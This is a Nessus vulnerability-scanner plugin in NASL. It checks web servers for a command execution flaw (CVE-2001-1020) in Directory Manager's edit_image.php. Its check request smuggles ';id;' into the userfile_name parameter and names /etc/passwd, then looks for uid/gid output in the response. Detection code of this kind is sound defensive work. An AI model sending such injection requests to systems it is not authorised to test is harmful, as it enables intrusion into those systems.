#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11104);
 script_version ("$Revision: 1.21 $");

 script_cve_id("CVE-2001-1020");
 script_bugtraq_id(3288);
 script_osvdb_id(1948);
 
 script_name(english:"Directory Manager edit_image.php Arbitrary Command Execution");
 script_summary(english:"Tries to use edit_image.php to execute a command");
 
 script_set_attribute(attribute:"synopsis", value:
"The web application running on the remote host has a command
execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"Directory Manager is installed and does not properly filter user input.
A remote attacker may use this flaw to execute arbitrary commands." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Sep/49" );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or firewall your web server." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/09/05");
 script_cvs_date("$Date: 2016/10/10 15:57:04 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/PHP");
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)) exit(0);


http_check_remote_code (
			check_request:"/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
